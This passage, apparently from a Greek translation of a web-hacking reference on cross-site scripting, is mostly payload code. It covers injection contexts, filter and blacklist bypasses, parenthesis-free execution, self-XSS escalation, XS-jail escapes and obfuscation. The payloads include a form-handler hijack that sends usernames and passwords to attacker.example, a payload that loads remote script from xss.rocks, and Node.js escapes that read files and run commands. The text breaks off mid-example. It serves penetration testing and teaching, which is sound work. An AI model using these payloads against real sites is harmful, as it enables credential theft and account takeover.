Για παράδειγμα, μπορείτε να προσθέσετε κάποιο styling στο στοιχείο όπως: `position: fixed; top: 0; left: 0; width: 100%; height: 100%; background-color: red; opacity: 0.5`

Αλλά, αν το WAF φιλτράρει το style attribute, μπορείτε να χρησιμοποιήσετε CSS Styling Gadgets, οπότε αν βρείτε, για παράδειγμα

> .test {display:block; color: blue; width: 100%\}

και

> \#someid {top: 0; font-family: Tahoma;}

Τώρα μπορείτε να τροποποιήσετε τον σύνδεσμό μας και να τον φέρετε στη μορφή

> \<a href="" id=someid class=test onclick=alert() a="">

Αυτό το κόλπο προέρχεται από [https://medium.com/@skavans\_/improving-the-impact-of-a-mouse-related-xss-with-styling-and-css-gadgets-b1e5dec2f703](https://medium.com/@skavans_/improving-the-impact-of-a-mouse-related-xss-with-styling-and-css-gadgets-b1e5dec2f703)

## Injecting inside JavaScript code

Σε αυτές τις περιπτώσεις το **input** σας θα αντανακλάται μέσα στον JS κώδικα ενός `.js` αρχείου ή ανάμεσα σε `<script>...</script>` tags ή σε HTML events που μπορούν να εκτελέσουν JS code ή σε attributes που δέχονται το `javascript:` πρωτόκολλο.

### Escaping \<script> tag

Αν ο κώδικάς σας εισάγεται μέσα σε `<script> [...] var input = 'reflected data' [...] </script>` μπορείτε εύκολα να **αποδράσετε κλείνοντας το `<script>`** tag:
```javascript
</script><img src=1 onerror=alert(document.domain)>
```
Note that in this example we **haven't even closed the single quote**. This is because **HTML parsing is performed first by the browser**, which involves identifying page elements, including blocks of script. The parsing of JavaScript to understand and execute the embedded scripts is only carried out afterward.

### Inside JS code

If `<>` are being sanitised you can still **escape the string** where your input is being **located** and **execute arbitrary JS**. It's important to **fix JS syntax**, because if there are any errors, the JS code won't be executed:
```
'-alert(document.domain)-'
';alert(document.domain)//
\';alert(document.domain)//
```
#### JS-in-JS string break → inject → repair pattern

Όταν η είσοδος του χρήστη καταλήγει μέσα σε μια JavaScript συμβολοσειρά σε εισαγωγικά (π.χ., server-side echo into an inline script), μπορείτε να τερματίσετε τη συμβολοσειρά, να εισάγετε κώδικα και να επισκευάσετε το συντακτικό ώστε η ανάλυση να παραμείνει έγκυρη. Γενικός σκελετός:
```
"            // end original string
;            // safely terminate the statement
<INJECTION>  // attacker-controlled JS
; a = "      // repair and resume expected string/statement
```
Παράδειγμα προτύπου URL όταν η ευάλωτη παράμετρος αντικατοπτρίζεται σε μια JS string:
```
?param=test";<INJECTION>;a="
```
Αυτό εκτελεί attacker JS χωρίς να χρειάζεται να πειράξετε το HTML context (pure JS-in-JS). Συνδυάστε με blacklist bypasses παρακάτω όταν τα filters μπλοκάρουν keywords.

### Template literals ``

Προκειμένου να κατασκευάσετε **strings**, πέρα από τα μονά και διπλά quotes το JS επίσης δέχεται **backticks** **` `` `**. Αυτό είναι γνωστό ως template literals καθώς επιτρέπουν να **embedded JS expressions** χρησιμοποιώντας τη σύνταξη `${ ... }`.\
Επομένως, αν διαπιστώσετε ότι η είσοδός σας αντανακλάται μέσα σε ένα JS string που χρησιμοποιεί backticks, μπορείτε να εκμεταλλευτείτε τη σύνταξη `${ ... }` για να εκτελέσετε **arbitrary JS code**:

Αυτό μπορεί να **εκμεταλλευτεί** χρησιμοποιώντας:
```javascript
;`${alert(1)}``${`${`${`${alert(1)}`}`}`}`
```

```javascript
// This is valid JS code, because each time the function returns itself it's recalled with ``
function loop() {
return loop
}
loop``
```
### Κωδικοποιημένη εκτέλεση κώδικα
```html
<script>\u0061lert(1)</script>
<svg><script>alert&lpar;'1'&rpar;
<svg><script>alert(1)</script></svg>  <!-- The svg tags are neccesary
<iframe srcdoc="<SCRIPT>alert(1)</iframe>">
```
#### Παραδοτέα payloads με eval(atob()) και αποχρώσεις του scope

Για να κρατήσετε τις διευθύνσεις URL πιο σύντομες και να παρακάμψετε απλά φίλτρα λέξεων-κλειδιών, μπορείτε να κωδικοποιήσετε σε base64 την πραγματική λογική σας και να την εκτελέσετε με `eval(atob('...'))`. Αν απλά φίλτρα λέξεων-κλειδιών μπλοκάρουν αναγνωριστικά όπως `alert`, `eval` ή `atob`, χρησιμοποιήστε αναγνωριστικά με Unicode escape που μεταγλωττίζονται εξίσου στον περιηγητή αλλά αποφεύγουν φίλτρα που ταιριάζουν συμβολοσειρές:
```
\u0061\u006C\u0065\u0072\u0074(1)                      // alert(1)
\u0065\u0076\u0061\u006C(\u0061\u0074\u006F\u0062('BASE64'))  // eval(atob('...'))
```
Σημαντική σημείωση scoping: `const`/`let` που δηλώνονται μέσα σε `eval()` είναι block-scoped και ΔΕΝ δημιουργούν globals· δεν θα είναι προσβάσιμες από μεταγενέστερα scripts. Χρησιμοποίησε ένα δυναμικά εγχεόμενο `<script>` element για να ορίσεις global, non-rebindable hooks όταν χρειάζεται (π.χ., για να hijack-άρεις έναν form handler):
```javascript
var s = document.createElement('script');
s.textContent = "const DoLogin = () => {const pwd = Trim(FormInput.InputPassword.value); const user = Trim(FormInput.InputUtente.value); fetch('https://attacker.example/?u='+encodeURIComponent(user)+'&p='+encodeURIComponent(pwd));}";
document.head.appendChild(s);
```
Αναφορά: https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/eval

### Κωδικοποίηση Unicode για εκτέλεση JS
```javascript
alert(1)
alert(1)
alert(1)
```
### JavaScript τεχνικές παράκαμψης μαύρων λιστών

**Strings**
```javascript
"thisisastring"
'thisisastrig'
`thisisastring`
/thisisastring/ == "/thisisastring/"
/thisisastring/.source == "thisisastring"
"\h\e\l\l\o"
String.fromCharCode(116,104,105,115,105,115,97,115,116,114,105,110,103)
"\x74\x68\x69\x73\x69\x73\x61\x73\x74\x72\x69\x6e\x67"
"\164\150\151\163\151\163\141\163\164\162\151\156\147"
"\u0074\u0068\u0069\u0073\u0069\u0073\u0061\u0073\u0074\u0072\u0069\u006e\u0067"
"\u{74}\u{68}\u{69}\u{73}\u{69}\u{73}\u{61}\u{73}\u{74}\u{72}\u{69}\u{6e}\u{67}"
"\a\l\ert\(1\)"
atob("dGhpc2lzYXN0cmluZw==")
eval(8680439..toString(30))(983801..toString(36))
```
**Ειδικές αλληλουχίες διαφυγής**
```javascript
"\b" //backspace
"\f" //form feed
"\n" //new line
"\r" //carriage return
"\t" //tab
"\b" //backspace
"\f" //form feed
"\n" //new line
"\r" //carriage return
"\t" //tab
// Any other char escaped is just itself
```
**Αντικαταστάσεις κενών μέσα σε JS κώδικα**
```javascript
<TAB>
/**/
```
**JavaScript comments (από** [**JavaScript Comments**](#javascript-comments) **κόλπο)**
```javascript
//This is a 1 line comment
/* This is a multiline comment*/
<!--This is a 1line comment
#!This is a 1 line comment, but "#!" must to be at the beggining of the first line
-->This is a 1 line comment, but "-->" must to be at the beggining of the first line
```
**JavaScript new lines (από** [**JavaScript new line**](#javascript-new-lines) **κόλπο)**
```javascript
//Javascript interpret as new line these chars:
String.fromCharCode(10)
alert("//\nalert(1)") //0x0a
String.fromCharCode(13)
alert("//\ralert(1)") //0x0d
String.fromCharCode(8232)
alert("//\u2028alert(1)") //0xe2 0x80 0xa8
String.fromCharCode(8233)
alert("//\u2029alert(1)") //0xe2 0x80 0xa9
```
**JavaScript κενά**
```javascript
log=[];
function funct(){}
for(let i=0;i<=0x10ffff;i++){
try{
eval(`funct${String.fromCodePoint(i)}()`);
log.push(i);
}
catch(e){}
}
console.log(log)
//9,10,11,12,13,32,160,5760,8192,8193,8194,8195,8196,8197,8198,8199,8200,8201,8202,8232,8233,8239,8287,12288,65279

//Either the raw characters can be used or you can HTML encode them if they appear in SVG or HTML attributes:
<img/src/onerror=alert&#65279;(1)>
```
**Javascript μέσα σε σχόλιο**
```javascript
//If you can only inject inside a JS comment, you can still leak something
//If the user opens DevTools request to the indicated sourceMappingURL will be send

//# sourceMappingURL=https://evdr12qyinbtbd29yju31993gumlaby0.oastify.com
```
**JavaScript χωρίς παρενθέσεις**
```javascript
// By setting location
window.location='javascript:alert\x281\x29'
x=new DOMMatrix;matrix=alert;x.a=1337;location='javascript'+':'+x
// or any DOMXSS sink such as location=name

// Backtips
// Backtips pass the string as an array of lenght 1
alert`1`

// Backtips + Tagged Templates + call/apply
eval`alert\x281\x29` // This won't work as it will just return the passed array
setTimeout`alert\x281\x29`
eval.call`${'alert\x281\x29'}`
eval.apply`${[`alert\x281\x29`]}`
[].sort.call`${alert}1337`
[].map.call`${eval}\\u{61}lert\x281337\x29`

// To pass several arguments you can use
function btt(){
console.log(arguments);
}
btt`${'arg1'}${'arg2'}${'arg3'}`

//It's possible to construct a function and call it
Function`x${'alert(1337)'}x`

// .replace can use regexes and call a function if something is found
"a,".replace`a${alert}` //Initial ["a"] is passed to str as "a," and thats why the initial string is "a,"
"a".replace.call`1${/./}${alert}`
// This happened in the previous example
// Change "this" value of call to "1,"
// match anything with regex /./
// call alert with "1"
"a".replace.call`1337${/..../}${alert}` //alert with 1337 instead

// Using Reflect.apply to call any function with any argumnets
Reflect.apply.call`${alert}${window}${[1337]}` //Pass the function to call (“alert”), then the “this” value to that function (“window”) which avoids the illegal invocation error and finally an array of arguments to pass to the function.
Reflect.apply.call`${navigation.navigate}${navigation}${[name]}`
// Using Reflect.set to call set any value to a variable
Reflect.set.call`${location}${'href'}${'javascript:alert\x281337\x29'}` // It requires a valid object in the first argument (“location”), a property in the second argument and a value to assign in the third.



// valueOf, toString
// These operations are called when the object is used as a primitive
// Because the objet is passed as "this" and alert() needs "window" to be the value of "this", "window" methods are used
valueOf=alert;window+''
toString=alert;window+''


// Error handler
window.onerror=eval;throw"=alert\x281\x29";
onerror=eval;throw"=alert\x281\x29";
<img src=x onerror="window.onerror=eval;throw'=alert\x281\x29'">
{onerror=eval}throw"=alert(1)" //No ";"
onerror=alert //No ";" using new line
throw 1337
// Error handler + Special unicode separators
eval("onerror=\u2028alert\u2029throw 1337");
// Error handler + Comma separator
// The comma separator goes through the list and returns only the last element
var a = (1,2,3,4,5,6) // a = 6
throw onerror=alert,1337 // this is throw 1337, after setting the onerror event to alert
throw onerror=alert,1,1,1,1,1,1337
// optional exception variables inside a catch clause.
try{throw onerror=alert}catch{throw 1}


// Has instance symbol
'alert\x281\x29'instanceof{[Symbol['hasInstance']]:eval}
'alert\x281\x29'instanceof{[Symbol.hasInstance]:eval}
// The “has instance” symbol allows you to customise the behaviour of the instanceof operator, if you set this symbol it will pass the left operand to the function defined by the symbol.

```
- [https://github.com/RenwaX23/XSS-Payloads/blob/master/Without-Parentheses.md](https://github.com/RenwaX23/XSS-Payloads/blob/master/Without-Parentheses.md)
- [https://portswigger.net/research/javascript-without-parentheses-using-dommatrix](https://portswigger.net/research/javascript-without-parentheses-using-dommatrix)

**Αυθαίρετη κλήση συνάρτησης (alert)**
```javascript
//Eval like functions
eval('ale'+'rt(1)')
setTimeout('ale'+'rt(2)');
setInterval('ale'+'rt(10)');
Function('ale'+'rt(10)')``;
[].constructor.constructor("alert(document.domain)")``
[]["constructor"]["constructor"]`$${alert()}```
import('data:text/javascript,alert(1)')

//General function executions
`` //Can be use as parenthesis
alert`document.cookie`
alert(document['cookie'])
with(document)alert(cookie)
(alert)(1)
(alert(1))in"."
a=alert,a(1)
[1].find(alert)
window['alert'](0)
parent['alert'](1)
self['alert'](2)
top['alert'](3)
this['alert'](4)
frames['alert'](5)
content['alert'](6)
[7].map(alert)
[8].find(alert)
[9].every(alert)
[10].filter(alert)
[11].findIndex(alert)
[12].forEach(alert);
top[/al/.source+/ert/.source](1)
top[8680439..toString(30)](1)
Function("ale"+"rt(1)")();
new Function`al\ert\`6\``;
Set.constructor('ale'+'rt(13)')();
Set.constructor`al\x65rt\x2814\x29```;
$='e'; x='ev'+'al'; x=this[x]; y='al'+$+'rt(1)'; y=x(y); x(y)
x='ev'+'al'; x=this[x]; y='ale'+'rt(1)'; x(x(y))
this[[]+('eva')+(/x/,new Array)+'l'](/xxx.xxx.xxx.xxx.xx/+alert(1),new Array)
globalThis[`al`+/ert/.source]`1`
this[`al`+/ert/.source]`1`
[alert][0].call(this,1)
window['a'+'l'+'e'+'r'+'t']()
window['a'+'l'+'e'+'r'+'t'].call(this,1)
top['a'+'l'+'e'+'r'+'t'].apply(this,[1])
(1,2,3,4,5,6,7,8,alert)(1)
x=alert,x(1)
[1].find(alert)
top["al"+"ert"](1)
top[/al/.source+/ert/.source](1)
al\u0065rt(1)
al\u0065rt`1`
top['al\145rt'](1)
top['al\x65rt'](1)
top[8680439..toString(30)](1)
<svg><animate onbegin=alert() attributeName=x></svg>
```
## **DOM vulnerabilities**

Υπάρχει **JS code** που χρησιμοποιεί **μη ασφαλή δεδομένα ελεγχόμενα από επιτιθέμενο** όπως `location.href`. Ένας επιτιθέμενος μπορεί να εκμεταλλευτεί αυτό για να εκτελέσει αυθαίρετο JS κώδικα.\
**Due to the extension of the explanation of** [**DOM vulnerabilities it was moved to this page**](dom-xss.md)**:**


{{#ref}}
dom-xss.md
{{#endref}}

Εκεί θα βρείτε μια λεπτομερή **explanation of what DOM vulnerabilities are, how are they provoked, and how to exploit them**.\
Επίσης, μην ξεχάσετε ότι **στο τέλος του αναφερόμενου άρθρου** μπορείτε να βρείτε μια εξήγηση για [**DOM Clobbering attacks**](dom-xss.md#dom-clobbering).

### Upgrading Self-XSS

### Cookie XSS

Αν μπορείτε να ενεργοποιήσετε ένα XSS στέλνοντας το payload μέσα σε ένα cookie, αυτό συνήθως είναι self-XSS. Ωστόσο, αν βρείτε ένα **vulnerable subdomain to XSS**, μπορείτε να εκμεταλλευτείτε αυτό το XSS για να εγχύσετε ένα cookie σε ολόκληρο το domain καταφέρνοντας να ενεργοποιηθεί το cookie XSS στο κύριο domain ή σε άλλα subdomains (αυτά που είναι vulnerable σε cookie XSS). Για αυτό μπορείτε να χρησιμοποιήσετε το cookie tossing attack:


{{#ref}}
../hacking-with-cookies/cookie-tossing.md
{{#endref}}

Μπορείτε να βρείτε μια εξαιρετική κατάχρηση αυτής της τεχνικής σε [**this blog post**](https://nokline.github.io/bugbounty/2024/06/07/Zoom-ATO.html).

### Sending your session to the admin

Ίσως ένας χρήστης να μπορεί να μοιραστεί το προφίλ του με τον admin και αν το self XSS βρίσκεται μέσα στο προφίλ του χρήστη και ο admin το επισκεφθεί, θα ενεργοποιήσει την ευπάθεια.

### Session Mirroring

Αν βρείτε κάποιο self XSS και η σελίδα έχει **session mirroring for administrators**, για παράδειγμα επιτρέποντας στους clients να ζητήσουν βοήθεια και προκειμένου ο admin να βοηθήσει, θα βλέπει αυτό που βλέπετε στη συνεδρία σας αλλά από τη δική του συνεδρία.

Μπορείτε να κάνετε τον **administrator trigger your self XSS** και να κλέψετε τα cookies/session του.

## Άλλες Παρακάμψεις

### Bypassing sanitization via WASM linear-memory template overwrite

Όταν μια web app χρησιμοποιεί Emscripten/WASM, οι σταθερές αλφαριθμητικές (όπως HTML format stubs) ζουν σε εγγράψιμη linear memory. Ένα μεμονωμένο in‑WASM overflow (π.χ., unchecked memcpy σε ένα edit path) μπορεί να καταστρέψει γειτονικές δομές και να ανακατευθύνει εγγραφές σε αυτές τις σταθερές. Η υπερχείλιση ενός template όπως "<article><p>%.*s</p></article>" σε "<img src=1 onerror=%.*s>" μετατρέπει το sanitized input σε μια τιμή JavaScript handler και παράγει άμεσο DOM XSS κατά το render.

Ελέγξτε την αφιερωμένη σελίδα με το exploitation workflow, DevTools memory helpers, και defenses:

{{#ref}}
wasm-linear-memory-template-overwrite-xss.md
{{#endref}}


### Normalised Unicode

Μπορείτε να ελέγξετε αν οι **reflected values** υποβάλλονται σε **unicode normalized** στον server (ή στην client πλευρά) και να εκμεταλλευτείτε αυτή τη λειτουργία για να παρακάμψετε protections. [**Find an example here**](../unicode-injection/index.html#xss-cross-site-scripting).

### PHP FILTER_VALIDATE_EMAIL flag Bypass
```javascript
"><svg/onload=confirm(1)>"@x.y
```
### Ruby-On-Rails bypass

Λόγω **RoR mass assignment** εισάγονται εισαγωγικά στο HTML και στη συνέχεια ο περιορισμός των εισαγωγικών παρακάμπτεται και μπορούν να προστεθούν επιπλέον πεδία (onfocus) μέσα στο tag.\
Παράδειγμα φόρμας ([from this report](https://hackerone.com/reports/709336)), αν στείλετε το payload:
```
contact[email] onfocus=javascript:alert('xss') autofocus a=a&form_type[a]aaa
```
Το ζεύγος "Key","Value" θα εμφανιστεί έτσι:
```
{" onfocus=javascript:alert(&#39;xss&#39;) autofocus a"=>"a"}
```
Στη συνέχεια, το attribute onfocus θα εισαχθεί και θα προκύψει XSS.

### Ειδικοί συνδυασμοί
```html
<iframe/src="data:text/html,<svg onload=alert(1)>">
<input type=image src onerror="prompt(1)">
<svg onload=alert(1)//
<img src="/" =_=" title="onerror='prompt(1)'">
<img src='1' onerror='alert(0)' <
<script x> alert(1) </script 1=2
<script x>alert('XSS')<script y>
<svg/onload=location=`javas`+`cript:ale`+`rt%2`+`81%2`+`9`;//
<svg////////onload=alert(1)>
<svg id=x;onload=alert(1)>
<svg id=`x`onload=alert(1)>
<img src=1 alt=al lang=ert onerror=top[alt+lang](0)>
<script>$=1,alert($)</script>
<script ~~~>confirm(1)</script ~~~>
<script>$=1,\u0061lert($)</script>
<</script/script><script>eval('\\u'+'0061'+'lert(1)')//</script>
<</script/script><script ~~~>\u0061lert(1)</script ~~~>
</style></scRipt><scRipt>alert(1)</scRipt>
<img src=x:prompt(eval(alt)) onerror=eval(src) alt=String.fromCharCode(88,83,83)>
<svg><x><script>alert('1'&#41</x>
<iframe src=""/srcdoc='<svg onload=alert(1)>'>
<svg><animate onbegin=alert() attributeName=x></svg>
<img/id="alert('XSS')\"/alt=\"/\"src=\"/\"onerror=eval(id)>
<img src=1 onerror="s=document.createElement('script');s.src='http://xss.rocks/xss.js';document.body.appendChild(s);">
(function(x){this[x+`ert`](1)})`al`
window[`al`+/e/[`ex`+`ec`]`e`+`rt`](2)
document['default'+'View'][`\u0061lert`](3)
```
### XSS with header injection in a 302 response

Αν βρείτε ότι μπορείτε να **inject headers in a 302 Redirect response** μπορείτε να δοκιμάσετε να **make the browser execute arbitrary JavaScript**. Αυτό δεν είναι **trivial** καθώς τα σύγχρονα browsers δεν ερμηνεύουν το HTTP response body όταν ο HTTP response status code είναι 302, οπότε ένα απλό cross-site scripting payload είναι άχρηστο.

Στους [**this report**](https://www.gremwell.com/firefox-xss-302) και [**this one**](https://www.hahwul.com/2020/10/03/forcing-http-redirect-xss/) μπορείτε να διαβάσετε πώς να δοκιμάσετε διάφορα protocols μέσα στο Location header και να δείτε αν κάποιο από αυτά επιτρέπει στον browser να ελέγξει και να εκτελέσει το XSS payload μέσα στο body.\
Παραδείγματα γνωστών protocols: `mailto://`, `//x:1/`, `ws://`, `wss://`, _empty Location header_, `resource://`.

### Μόνο γράμματα, αριθμοί και τελείες

Αν μπορείτε να υποδείξετε τον **callback** που το javascript πρόκειται να **execute** περιορισμένο σε αυτούς τους χαρακτήρες. [**Read this section of this post**](#javascript-function) για να βρείτε πώς να abuse this behaviour.

### Valid `<script>` Content-Types to XSS

(From [**here**](https://blog.huli.tw/2022/04/24/en/how-much-do-you-know-about-script-type/)) Αν προσπαθήσετε να φορτώσετε ένα script με **content-type** όπως `application/octet-stream`, το Chrome θα εμφανίσει το ακόλουθο σφάλμα:

> Refused to execute script from ‘[https://uploader.c.hc.lc/uploads/xxx'](https://uploader.c.hc.lc/uploads/xxx') because its MIME type (‘application/octet-stream’) is not executable, and strict MIME type checking is enabled.

Οι μόνες **Content-Type**s που θα επιτρέψουν στο Chrome να τρέξει ένα **loaded script** είναι αυτές που βρίσκονται μέσα στο const **`kSupportedJavascriptTypes`** από [https://chromium.googlesource.com/chromium/src.git/+/refs/tags/103.0.5012.1/third_party/blink/common/mime_util/mime_util.cc](https://chromium.googlesource.com/chromium/src.git/+/refs/tags/103.0.5012.1/third_party/blink/common/mime_util/mime_util.cc)
```c
const char* const kSupportedJavascriptTypes[] = {
"application/ecmascript",
"application/javascript",
"application/x-ecmascript",
"application/x-javascript",
"text/ecmascript",
"text/javascript",
"text/javascript1.0",
"text/javascript1.1",
"text/javascript1.2",
"text/javascript1.3",
"text/javascript1.4",
"text/javascript1.5",
"text/jscript",
"text/livescript",
"text/x-ecmascript",
"text/x-javascript",
};

```
### Τύποι Script για XSS

(Από [**here**](https://blog.huli.tw/2022/04/24/en/how-much-do-you-know-about-script-type/)) Άρα, ποιοι τύποι μπορούν να υποδειχθούν για να φορτωθεί ένα script;
```html
<script type="???"></script>
```
Η απάντηση είναι:

- **module** (default, δεν χρειάζεται εξήγηση)
- [**webbundle**](https://web.dev/web-bundles/): Web Bundles είναι μια λειτουργία που σας επιτρέπει να πακετάρετε πολλά δεδομένα (HTML, CSS, JS…) σε ένα αρχείο **`.wbn`**.
```html
<script type="webbundle">
{
"source": "https://example.com/dir/subresources.wbn",
"resources": ["https://example.com/dir/a.js", "https://example.com/dir/b.js", "https://example.com/dir/c.png"]
}
</script>
The resources are loaded from the source .wbn, not accessed via HTTP
```
- [**importmap**](https://github.com/WICG/import-maps)**:** Επιτρέπει τη βελτίωση της σύνταξης import
```html
<script type="importmap">
{
"imports": {
"moment": "/node_modules/moment/src/moment.js",
"lodash": "/node_modules/lodash-es/lodash.js"
}
}
</script>

<!-- With importmap you can do the following -->
<script>
import moment from "moment"
import { partition } from "lodash"
</script>
```
Αυτή η συμπεριφορά χρησιμοποιήθηκε στο [**this writeup**](https://github.com/zwade/yaca/tree/master/solution) για να επαναχαρτογραφηθεί μια βιβλιοθήκη σε eval ώστε η κακοχρησία της να μπορεί να προκαλέσει XSS.

- [**speculationrules**](https://github.com/WICG/nav-speculation)**:** Αυτή η λειτουργία υπάρχει κυρίως για να επιλύσει κάποια προβλήματα που προκαλούνται από την προ-απόδοση. Λειτουργεί ως εξής:
```html
<script type="speculationrules">
{
"prerender": [
{ "source": "list", "urls": ["/page/2"], "score": 0.5 },
{
"source": "document",
"if_href_matches": ["https://*.wikipedia.org/**"],
"if_not_selector_matches": [".restricted-section *"],
"score": 0.1
}
]
}
</script>
```
### Web Content-Types για XSS

(From [**here**](https://blog.huli.tw/2022/04/24/en/how-much-do-you-know-about-script-type/)) Τα παρακάτω content types μπορούν να εκτελέσουν XSS σε όλους τους browsers:

- text/html
- application/xhtml+xml
- application/xml
- text/xml
- image/svg+xml
- text/plain (?? not in the list but I think I saw this in a CTF)
- application/rss+xml (off)
- application/atom+xml (off)

Σε άλλους browsers άλλα **`Content-Types`** μπορούν να χρησιμοποιηθούν για να εκτελέσουν αυθαίρετο JS, δείτε: [https://github.com/BlackFan/content-type-research/blob/master/XSS.md](https://github.com/BlackFan/content-type-research/blob/master/XSS.md)

### xml Content Type

Αν η σελίδα επιστρέφει a text/xml content-type είναι δυνατόν να δηλωθεί ένα namespace και να εκτελεστεί αυθαίρετο JS:
```xml
<xml>
<text>hello<img src="1" onerror="alert(1)" xmlns="http://www.w3.org/1999/xhtml" /></text>
</xml>

<!-- Heyes, Gareth. JavaScript for hackers: Learn to think like a hacker (p. 113). Kindle Edition. -->
```
### Ειδικά μοτίβα αντικατάστασης

Όταν κάτι σαν **`"some {{template}} data".replace("{{template}}", <user_input>)`** χρησιμοποιείται. Ο attacker θα μπορούσε να χρησιμοποιήσει [**special string replacements**](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/String/replace#specifying_a_string_as_the-replacement) για να προσπαθήσει να παρακάμψει κάποιες προστασίες: `` "123 {{template}} 456".replace("{{template}}", JSON.stringify({"name": "$'$`alert(1)//"})) ``

Για παράδειγμα στο [**this writeup**](https://gitea.nitowa.xyz/nitowa/PlaidCTF-YACA), αυτό χρησιμοποιήθηκε για να **scape a JSON string** μέσα σε ένα script και να execute arbitrary code.

### Chrome Cache to XSS


{{#ref}}
chrome-cache-to-xss.md
{{#endref}}

### XS Jails Escape

Αν έχεις μόνο περιορισμένο σύνολο χαρακτήρων για χρήση, εξέτασε αυτές τις άλλες έγκυρες λύσεις για προβλήματα XSJail:
```javascript
// eval + unescape + regex
eval(unescape(/%2f%0athis%2econstructor%2econstructor(%22return(process%2emainModule%2erequire(%27fs%27)%2ereadFileSync(%27flag%2etxt%27,%27utf8%27))%22)%2f/))()
eval(unescape(1+/1,this%2evalueOf%2econstructor(%22process%2emainModule%2erequire(%27repl%27)%2estart()%22)()%2f/))

// use of with
with(console)log(123)
with(/console.log(1)/index.html)with(this)with(constructor)constructor(source)()
// Just replace console.log(1) to the real code, the code we want to run is:
//return String(process.mainModule.require('fs').readFileSync('flag.txt'))

with(process)with(mainModule)with(require('fs'))return(String(readFileSync('flag.txt')))
with(k='fs',n='flag.txt',process)with(mainModule)with(require(k))return(String(readFileSync(n)))
with(String)with(f=fromCharCode,k=f(102,115),n=f(102,108,97,103,46,116,120,116),process)with(mainModule)with(require(k))return(String(readFileSync(n)))

//Final solution
with(
/with(String)
with(f=fromCharCode,k=f(102,115),n=f(102,108,97,103,46,116,120,116),process)
with(mainModule)
with(require(k))
return(String(readFileSync(n)))
/)
with(this)
with(constructor)
constructor(source)()

// For more uses of with go to challenge misc/CaaSio PSE in
// https://blog.huli.tw/2022/05/05/en/angstrom-ctf-2022-writeup-en/#misc/CaaSio%20PSE
```
Αν **όλα είναι undefined** πριν από την εκτέλεση μη αξιόπιστου κώδικα (όπως στο [**this writeup**](https://blog.huli.tw/2022/02/08/en/what-i-learned-from-dicectf-2022/index.html#miscx2fundefined55-solves)) είναι δυνατόν να δημιουργηθούν χρήσιμα αντικείμενα "από το τίποτα" για να καταχραστεί η εκτέλεση αυθαίρετου μη αξιόπιστου κώδικα:

- Χρήση import()
```javascript
// although import "fs" doesn’t work, import('fs') does.
import("fs").then((m) => console.log(m.readFileSync("/flag.txt", "utf8")))
```
- Πρόσβαση στο `require` έμμεσα

[According to this](https://stackoverflow.com/questions/28955047/why-does-a-module-level-return-statement-work-in-node-js/28955050#28955050) modules τυλίγονται από το Node.js μέσα σε μια συνάρτηση, ως εξής:
```javascript
;(function (exports, require, module, __filename, __dirname) {
// our actual module code
})
```
Επομένως, αν από αυτό το module μπορούμε να **καλέσουμε άλλη συνάρτηση**, είναι δυνατό να χρησιμοποιήσουμε `arguments.callee.caller.arguments[1]` από αυτή τη συνάρτηση για να αποκτήσουμε πρόσβαση στο **`require`**:
```javascript
;(function () {
return arguments.callee.caller.arguments[1]("fs").readFileSync(
"/flag.txt",
"utf8"
)
})()
```
Με παρόμοιο τρόπο με το προηγούμενο παράδειγμα, είναι δυνατό να **use error handlers** για να αποκτήσετε πρόσβαση στο **wrapper** του module και να πάρετε τη συνάρτηση **`require`**:
```javascript
try {
null.f()
} catch (e) {
TypeError = e.constructor
}
Object = {}.constructor
String = "".constructor
Error = TypeError.prototype.__proto__.constructor
function CustomError() {
const oldStackTrace = Error.prepareStackTrace
try {
Error.prepareStackTrace = (err, structuredStackTrace) =>
structuredStackTrace
Error.captureStackTrace(this)
this.stack
} finally {
Error.prepareStackTrace = oldStackTrace
}
}
function trigger() {
const err = new CustomError()
console.log(err.stack[0])
for (const x of err.stack) {
// use x.getFunction() to get the upper function, which is the one that Node.js adds a wrapper to, and then use arugments to get the parameter
const fn = x.getFunction()
console.log(String(fn).slice(0, 200))
console.log(fn?.arguments)
console.log("=".repeat(40))
if ((args = fn?.arguments)?.length > 0) {
req = args[1]
console.log(req("child_process").execSync("id").toString())
}
}
}
trigger()
```
### Απόκρυψη & Προηγμένη Παράκαμψη

- **Διάφορες τεχνικές απόκρυψης σε μία σελίδα:** [**https://aem1k.com/aurebesh.js/**](https://aem1k.com/aurebesh.js/)
- [https://github.com/aemkei/katakana.js](https://github.com/aemkei/katakana.js)
- [https://javascriptobfuscator.herokuapp.com/](https://javascriptobfuscator.herokuapp.com)
- [https://skalman.github.io/UglifyJS-online/](https://skalman.github.io/UglifyJS-online/)
- [http://www.jsfuck.com/](http://www.jsfuck.com)
- Πιο εξελιγμένο JSFuck: [https://medium.com/@Master_SEC/bypass-uppercase-filters-like-a-pro-xss-advanced-methods-daf7a82673ce](https://medium.com/@Master_SEC/bypass-uppercase-filters-like-a-pro-xss-advanced-methods-daf7a82673ce)
- [http://utf-8.jp/public/jjencode.html](http://utf-8.jp/public/jjencode.html)
- [https://utf-8.jp/public/aaencode.html](https://utf-8.jp/public/aaencode.html)
- [https://portswigger.net/research/the-seventh-way-to-call-a-javascript-function-without-parentheses](https://portswigger.net/research/the-seventh-way-to-call-a-javascript-function-without-parentheses)
```javascript
//Katana
<script>
([,ウ,,,,ア]=[]+{}
,[ネ,ホ,ヌ,セ,,ミ,ハ,ヘ,,,ナ]=[!!ウ]+!ウ+ウ.ウ)[ツ=ア+ウ+ナ+ヘ+ネ+ホ+ヌ+ア+ネ+ウ+ホ][ツ](ミ+ハ+セ+ホ+ネ+'(-~ウ)')()
</script>
```

```javascript
//JJencode
<script>$=~[];$={___:++$,$:(![]+"")[$],__$:++$,$_$_:(![]+"")[$],_$_:++$,$_$:({}+"")[$],$_$:($[$]+"")[$],_$:++$,$_:(!""+"")[$],$__:++$,$_$:++$,$__:({}+"")[$],$_:++$,$:++$,$___:++$,$__$:++$};$.$_=($.$_=$+"")[$.$_$]+($._$=$.$_[$.__$])+($.$=($.$+"")[$.__$])+((!$)+"")[$._$]+($.__=$.$_[$.$_])+($.$=(!""+"")[$.__$])+($._=(!""+"")[$._$_])+$.$_[$.$_$]+$.__+$._$+$.$;$.$=$.$+(!""+"")[$._$]+$.__+$._+$.$+$.$;$.$=($.___)[$.$_][$.$_];$.$($.$($.$+"\""+$.$_$_+(![]+"")[$._$_]+$.$_+"\\"+$.__$+$.$_+$._$_+$.__+"("+$.___+")"+"\"")())();</script>
```

```javascript
//JSFuck
<script>
